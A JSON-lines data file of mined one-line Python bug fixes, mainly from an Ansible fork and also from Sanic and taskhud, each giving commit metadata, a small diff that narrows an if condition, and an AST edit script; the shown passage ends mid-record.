{"project": "ansible-1", "commit_sha": "b0e6baf8c3cbc10154a476ad6d69369b27f051d7", "parent_sha": "bbe8f48a468c524da0f00fbef1cb5aaa7bfc0536", "file_path": "lib/ansible/executor/connection_info.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -239,7 +239,7 @@ class ConnectionInformation:\n         #    self.no_log     = boolean(options.no_log)\n         if options.check:\n             self.check_mode = boolean(options.check)\n-        if options.force_handlers:\n+        if hasattr(options, 'force_handlers') and options.force_handlers:\n             self.force_handlers = boolean(options.force_handlers)\n \n         # get the tag info from options, converting a comma-separated list\n", "before": "if options . force_handlers : self . force_handlers = boolean ( options . force_handlers )", "after": "if hasattr ( options , 'force_handlers' ) and options . force_handlers : self . force_handlers = boolean ( options . force_handlers )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 66], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 34], 2], [\"Insert\", \"N1\", [\"identifier:hasattr\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:options\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:'force_handlers'\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "ansible-1", "commit_sha": "35d138a0d6642536d63926b74260c0ebb8aee441", "parent_sha": "d2bf244eb88b710aac85d1d08973ea04219075ff", "file_path": "lib/ansible/utils/__init__.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -164,7 +164,7 @@ def check_conditional(conditional, basedir, inject, fail_on_undefined=False, jin\n     if conditional.startswith(\"jinja2_compare\"):\n         conditional = conditional.replace(\"jinja2_compare \",\"\")\n         # allow variable names\n-        if conditional in inject:\n+        if conditional in inject and str(inject[conditional]).find('-') == -1:\n             conditional = inject[conditional]\n         conditional = template.template(basedir, conditional, inject, fail_on_undefined=fail_on_undefined)\n         # a Jinja2 evaluation that results in something Python can eval!\n", "before": "if conditional in inject : conditional = inject [ conditional ]", "after": "if conditional in inject and str ( inject [ conditional ] ) . find ( '-' ) == - 1 : conditional = inject [ conditional ]", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 46], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 33], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"unary_operator\", \"N3\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N5\"], 1], [\"Insert\", \"N3\", [\"-:-\", \"T\"], 0], [\"Insert\", \"N3\", [\"integer:1\", \"T\"], 1], [\"Insert\", \"N4\", [\"call\", \"N6\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:find\", \"T\"], 2], [\"Insert\", \"N5\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N5\", [\"string:'-'\", \"T\"], 1], [\"Insert\", \"N5\", [\"):)\", \"T\"], 2], [\"Insert\", \"N6\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N6\", [\"argument_list\", \"N7\"], 1], [\"Insert\", \"N7\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N7\", [\"subscript\", \"N8\"], 1], [\"Insert\", \"N7\", [\"):)\", \"T\"], 2], [\"Insert\", \"N8\", [\"identifier:inject\", \"T\"], 0], [\"Insert\", \"N8\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N8\", [\"identifier:conditional\", \"T\"], 2], [\"Insert\", \"N8\", [\"]:]\", \"T\"], 3]]"}
{"project": "ansible-1", "commit_sha": "8a3f8b757be1434df61abc0c0e491920b467ca26", "parent_sha": "bff47df5ffd93b28a7da856882bc707d2f1a596a", "file_path": "lib/ansible/playbook/play.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -449,7 +449,7 @@ class Play(object):\n                     include_file = template(dirname, tokens[0], mv)\n                     include_filename = utils.path_dwim(dirname, include_file)\n                     data = utils.parse_yaml_from_file(include_filename)\n-                    if 'role_name' in x:\n+                    if 'role_name' in x and data is not None:\n                         for x in data:\n                             if 'include' in x:\n                                 x['role_name'] = new_role\n", "before": "if 'role_name' in x : for x in data : if 'include' in x : x [ 'role_name' ] = new_role", "after": "if 'role_name' in x and data is not None : for x in data : if 'include' in x : x [ 'role_name' ] = new_role", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 21, 6, 58], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 24, 3, 40], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:data\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 2], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 3]]"}
{"project": "ansible-1", "commit_sha": "ef69d23715b6222b5b16f5f152713fced4cc5090", "parent_sha": "61d283e2ad58916d640b129cdd0b1ef866bcb332", "file_path": "lib/ansible/runner/__init__.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -328,7 +328,7 @@ class Runner(object):\n \n         environment_string = self._compute_environment_string(inject)\n \n-        if (self.sudo or self.su) and (self.sudo_user != 'root' or self.su_user != 'root'):\n+        if tmp.find(\"tmp\") != -1 and (self.sudo or self.su) and (self.sudo_user != 'root' or self.su_user != 'root'):\n             # deal with possible umask issues once sudo'ed to other user\n             cmd_chmod = \"chmod a+r %s\" % remote_module_path\n             self._low_level_exec_command(conn, cmd_chmod, tmp, sudoable=False)\n", "before": "if ( self . sudo or self . su ) and ( self . sudo_user != 'root' or self . su_user != 'root' ) : cmd_chmod = \"chmod a+r %s\" % remote_module_path self . _low_level_exec_command ( conn , cmd_chmod , tmp , sudoable = False )", "after": "if tmp . find ( \"tmp\" ) != - 1 and ( self . sudo or self . su ) and ( self . sudo_user != 'root' or self . su_user != 'root' ) : cmd_chmod = \"chmod a+r %s\" % remote_module_path self . _low_level_exec_command ( conn , cmd_chmod , tmp , sudoable = False )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 91], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"parenthesized_expression\", 3, 12, 3, 34], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"unary_operator\", \"N3\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N5\"], 1], [\"Insert\", \"N3\", [\"-:-\", \"T\"], 0], [\"Insert\", \"N3\", [\"integer:1\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:tmp\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:find\", \"T\"], 2], [\"Insert\", \"N5\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N5\", [\"string:\\\"tmp\\\"\", \"T\"], 1], [\"Insert\", \"N5\", [\"):)\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "f2713f764c928dda10efd49b9dddbf5654ed686f", "parent_sha": "0c92ec5e8f1b902658a4d4f6e713e0640b0f09f8", "file_path": "lib/ansible/parsing/splitter.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -204,7 +204,7 @@ def split_args(args):\n             # to the end of the list, since we'll tack on more to it later\n             # otherwise, if we're inside any jinja2 block, inside quotes, or we were\n             # inside quotes (but aren't now) concat this token to the last param\n-            if inside_quotes and not was_inside_quotes:\n+            if inside_quotes and not was_inside_quotes and not(print_depth or block_depth or comment_depth):\n                 params.append(token)\n                 appended = True\n             elif print_depth or block_depth or comment_depth or inside_quotes or was_inside_quotes:\n", "before": "if inside_quotes and not was_inside_quotes : params . append ( token ) appended = True elif print_depth or block_depth or comment_depth or inside_quotes or was_inside_quotes : ", "after": "if inside_quotes and not was_inside_quotes and not ( print_depth or block_depth or comment_depth ) : params . append ( token ) appended = True elif print_depth or block_depth or comment_depth or inside_quotes or was_inside_quotes : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 34, 3, 55], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:was_inside_quotes\", 3, 38, 3, 55], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"parenthesized_expression\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"boolean_operator\", \"N3\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"boolean_operator\", \"N4\"], 0], [\"Insert\", \"N3\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:comment_depth\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:print_depth\", \"T\"], 0], [\"Insert\", \"N4\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:block_depth\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "1fc44e41039f850d9d19e92231479c9a50238132", "parent_sha": "3901556b3548b98d139f599f22337ce15058e199", "file_path": "lib/ansible/plugins/strategy/linear.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -230,7 +230,7 @@ class StrategyModule(StrategyBase):\n \n                         run_once = templar.template(task.run_once) or action and getattr(action, 'BYPASS_HOST_LOOP', False)\n \n-                        if task.any_errors_fatal or run_once:\n+                        if (task.any_errors_fatal or run_once) and not task.ignore_errors:\n                             any_errors_fatal = True\n \n                         if not callback_sent:\n", "before": "if task . any_errors_fatal or run_once : any_errors_fatal = True", "after": "if ( task . any_errors_fatal or run_once ) and not task . ignore_errors : any_errors_fatal = True", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 28, 3, 61], [\"parenthesized_expression\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 28, 3, 61], [\"and:and\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 28, 3, 61], [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"boolean_operator\", 3, 28, 3, 61], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 1], [\"Insert\", \"N2\", [\"identifier:task\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:ignore_errors\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "08a2f01a5f848af00ef13b2901a11cb279e569c9", "parent_sha": "b3495e238c58fd12b796932afc04fde2bf70c1e7", "file_path": "lib/ansible/modules/cloud/digital_ocean/digital_ocean_domain.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -195,7 +195,7 @@ def core(module):\n             records = domain.records()\n             at_record = None\n             for record in records:\n-                if record.name == \"@\":\n+                if record.name == \"@\" and record.record_type == 'A':\n                     at_record = record\n \n             if not at_record.data == getkeyordie(\"ip\"):\n", "before": "if record . name == \"@\" : at_record = record", "after": "if record . name == \"@\" and record . record_type == 'A' : at_record = record", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 39], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 38], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'A'\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:record\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:record_type\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "4e4e0cca176f27ce01b04c7bb47ce0dc02efb1df", "parent_sha": "3f4d412bff3fe4b6635004a2a6b642d33fb8cb7b", "file_path": "lib/ansible/modules/files/copy.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -181,7 +181,7 @@ def main():\n     if original_basename and dest.endswith(\"/\"):\n         dest = os.path.join(dest, original_basename)\n         dirname = os.path.dirname(dest)\n-        if not os.path.exists(dirname):\n+        if not os.path.exists(dirname) and '/' in dirname:\n             (pre_existing_dir, new_directory_list) = split_pre_existing_dir(dirname)\n             os.makedirs(dirname)\n             directory_args = module.load_file_common_arguments(module.params)\n", "before": "if not os . path . exists ( dirname ) : ( pre_existing_dir , new_directory_list ) = split_pre_existing_dir ( dirname ) os . makedirs ( dirname ) directory_args = module . load_file_common_arguments ( module . params )", "after": "if not os . path . exists ( dirname ) and '/' in dirname : ( pre_existing_dir , new_directory_list ) = split_pre_existing_dir ( dirname ) os . makedirs ( dirname ) directory_args = module . load_file_common_arguments ( module . params )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 12, 3, 39], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 39], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:'/'\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:dirname\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "6f91273fe116c303cb6194588337faa917975228", "parent_sha": "2d9d474f23b244d9b88acd63c348974a65a656ac", "file_path": "lib/ansible/modules/extras/cloud/cloudstack/cs_instance.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -779,7 +779,7 @@ class AnsibleCloudStackInstance(AnsibleCloudStack):\n                 self.result['affinity_groups'] = affinity_groups\n             if 'nic' in instance:\n                 for nic in instance['nic']:\n-                    if nic['isdefault']:\n+                    if nic['isdefault'] and 'ipaddress' in nic:\n                         self.result['default_ip'] = nic['ipaddress']\n         return self.result\n \n", "before": "if nic [ 'isdefault' ] : self . result [ 'default_ip' ] = nic [ 'ipaddress' ]", "after": "if nic [ 'isdefault' ] and 'ipaddress' in nic : self . result [ 'default_ip' ] = nic [ 'ipaddress' ]", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 21, 4, 69], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"subscript\", 3, 24, 3, 40], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:'ipaddress'\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:nic\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "d3b680e1c9b5c37fd07fd9999e9746871fd19824", "parent_sha": "d705647873af3eef227e71c4790ef562e3343f31", "file_path": "lib/ansible/modules/extras/cloud/cloudstack/cs_template.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -501,7 +501,7 @@ class AnsibleCloudStackTemplate(AnsibleCloudStack):\n                 return templates['template'][0]\n             else:\n                 for i in templates['template']:\n-                    if i['checksum'] == checksum:\n+                    if 'checksum' in i and i['checksum'] == checksum:\n                         return i\n         return None\n \n", "before": "if i [ 'checksum' ] == checksum : return i", "after": "if 'checksum' in i and i [ 'checksum' ] == checksum : return i", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 21, 4, 33], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 24, 3, 49], 2], [\"Insert\", \"N1\", [\"string:'checksum'\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:i\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "ce416f247f0737b4d7d63ca6ec471d0130446cee", "parent_sha": "daeec920b05b502d9afca148cc4fc54ecf0570c7", "file_path": "lib/ansible/modules/cloud/vmware/_vsphere_guest.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1808,7 +1808,7 @@ def main():\n         module.fail_json(msg='pysphere does not support verifying certificates with python < 2.7.9.  Either update python or set '\n                              'validate_certs=False on the task')\n \n-    if not validate_certs:\n+    if not validate_certs and hasattr(ssl, 'SSLContext'):\n         ssl._create_default_https_context = ssl._create_unverified_context\n \n     try:\n", "before": "if not validate_certs : ssl . _create_default_https_context = ssl . _create_unverified_context", "after": "if not validate_certs and hasattr ( ssl , 'SSLContext' ) : ssl . _create_default_https_context = ssl . _create_unverified_context", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 8, 3, 26], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:validate_certs\", 3, 12, 3, 26], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:hasattr\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:ssl\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:'SSLContext'\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "ansible-1", "commit_sha": "190d3fbbed19c04f207f9b0cc94efe90cfc7ec21", "parent_sha": "6c8d40f653063a70bdb127026860b2905eadf4d2", "file_path": "lib/ansible/modules/cloud/cloudstack/cs_instance.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -460,7 +460,7 @@ class AnsibleCloudStackInstance(AnsibleCloudStack):\n             return instance['userdata']\n \n         user_data = \"\"\n-        if self.get_user_data() is not None:\n+        if self.get_user_data() is not None and instance.get('id'):\n             res = self.query_api('getVirtualMachineUserData', virtualmachineid=instance['id'])\n             user_data = res['virtualmachineuserdata'].get('userdata', \"\")\n         return user_data\n", "before": "if self . get_user_data ( ) is not None : res = self . query_api ( 'getVirtualMachineUserData' , virtualmachineid = instance [ 'id' ] ) user_data = res [ 'virtualmachineuserdata' ] . get ( 'userdata' , \"\" )", "after": "if self . get_user_data ( ) is not None and instance . get ( 'id' ) : res = self . query_api ( 'getVirtualMachineUserData' , virtualmachineid = instance [ 'id' ] ) user_data = res [ 'virtualmachineuserdata' ] . get ( 'userdata' , \"\" )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 5, 74], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 44], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:instance\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"string:'id'\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "sanic", "commit_sha": "28c31359bf863ad6bcef2a49397908ca04f6ac1d", "parent_sha": "ff3d33d5e019e12fcc8cc95a0bf6fe290b11f73e", "file_path": "sanic/app.py", "project_url": "https://github.com/haoguangli/sanic", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -270,7 +270,7 @@ class Sanic:\n                     'Endpoint with name `{}` was not found'.format(\n                         view_name))\n \n-        if uri.endswith('/'):\n+        if uri != '/' and uri.endswith('/'):\n             uri = uri[:-1]\n \n         out = uri\n", "before": "if uri . endswith ( '/' ) : uri = uri [ : - 1 ]", "after": "if uri != '/' and uri . endswith ( '/' ) : uri = uri [ : - 1 ]", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 27], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 29], 2], [\"Insert\", \"N1\", [\"identifier:uri\", \"T\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'/'\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "c3940f16eb892ae9c2a24b5b766eef505c0d307a", "parent_sha": "4f0e1c850c4c6cca4324d24b9ce474038a09baf4", "file_path": "lib/ansible/modules/extras/system/crypttab.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -103,7 +103,7 @@ def main():\n     state          = module.params['state']\n     path           = module.params['path']\n \n-    if backing_device is None and password is None and opts is None:\n+    if state != 'absent' and backing_device is None and password is None and opts is None:\n         module.fail_json(msg=\"expected one or more of 'backing_device', 'password' or 'opts'\",\n                          **module.params)\n \n", "before": "if backing_device is None and password is None and opts is None : module . fail_json ( msg = \"expected one or more of 'backing_device', 'password' or 'opts'\" , ** module . params )", "after": "if state != 'absent' and backing_device is None and password is None and opts is None : module . fail_json ( msg = \"expected one or more of 'backing_device', 'password' or 'opts'\" , ** module . params )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 3, 51], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 30], 2], [\"Insert\", \"N1\", [\"identifier:state\", \"T\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'absent'\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "2adc325ef63e0f1ee74f7b2073b77e10a44d46e1", "parent_sha": "d6e16ded3fe8bc5670d6048c694bbfdbd9d7bcc7", "file_path": "lib/ansible/modules/cloud/amazon/ec2.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1306,7 +1306,7 @@ def startstop_instances(module, ec2, instance_ids, state, instance_tags):\n         for inst in res.instances:\n \n             # Check \"source_dest_check\" attribute\n-            if inst.get_attribute('sourceDestCheck')['sourceDestCheck'] != source_dest_check:\n+            if inst.vpc_id is not None and inst.get_attribute('sourceDestCheck')['sourceDestCheck'] != source_dest_check:\n                 inst.modify_attribute('sourceDestCheck', source_dest_check)\n                 changed = True\n \n", "before": "if inst . get_attribute ( 'sourceDestCheck' ) [ 'sourceDestCheck' ] != source_dest_check : inst . modify_attribute ( 'sourceDestCheck' , source_dest_check ) changed = True", "after": "if inst . vpc_id is not None and inst . get_attribute ( 'sourceDestCheck' ) [ 'sourceDestCheck' ] != source_dest_check : inst . modify_attribute ( 'sourceDestCheck' , source_dest_check ) changed = True", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 5, 31], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 93], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 2], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 3], [\"Insert\", \"N2\", [\"identifier:inst\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:vpc_id\", \"T\"], 2]]"}
{"project": "taskhud", "commit_sha": "91594132b59b108989ead41c00553527b3627df8", "parent_sha": "c9d28b8f14c52cb8e532ee5d6a0b5a917b2bc201", "file_path": "cwrapper.py", "project_url": "https://github.com/semtle/taskhud", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -210,7 +210,7 @@ class CursesHud:\n             #       have those keys\n             # see if new columns are needed to support this record\n             for k in record.keys():\n-                if k not in self.columns:\n+                if (k not in self.columns) and (k not in self.extra_info_keys):\n                     self.add_column(k)\n \n             # add record to local store\n", "before": "if k not in self . columns : self . add_column ( k )", "after": "if ( k not in self . columns ) and ( k not in self . extra_info_keys ) : self . add_column ( k )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 39], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N2\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"comparison_operator\", 3, 20, 3, 41], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"comparison_operator\", \"N3\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:k\", \"T\"], 0], [\"Insert\", \"N3\", [\"not:not\", \"T\"], 1], [\"Insert\", \"N3\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 3], [\"Insert\", \"N4\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:extra_info_keys\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "6ae04c1e4f698629610030a74f5bb5fc501f5a1e", "parent_sha": "5fef2c429763db8d088a20c97320936ee06e7fc8", "file_path": "lib/ansible/executor/play_iterator.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -397,7 +397,7 @@ class PlayIterator:\n \n     def _insert_tasks_into_state(self, state, task_list):\n         # if we've failed at all, or if the task list is empty, just return the current state\n-        if state.fail_state != self.FAILED_NONE or not task_list:\n+        if state.fail_state != self.FAILED_NONE and state.run_state not in (self.ITERATING_RESCUE, self.ITERATING_ALWAYS) or not task_list:\n             return state\n \n         if state.run_state == self.ITERATING_TASKS:\n", "before": "if state . fail_state != self . FAILED_NONE or not task_list : return state", "after": "if state . fail_state != self . FAILED_NONE and state . run_state not in ( self . ITERATING_RESCUE , self . ITERATING_ALWAYS ) or not task_list : return state", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 65], [\"boolean_operator\", \"N0\"], 0], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 48], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 1], [\"Insert\", \"N1\", [\"in:in\", 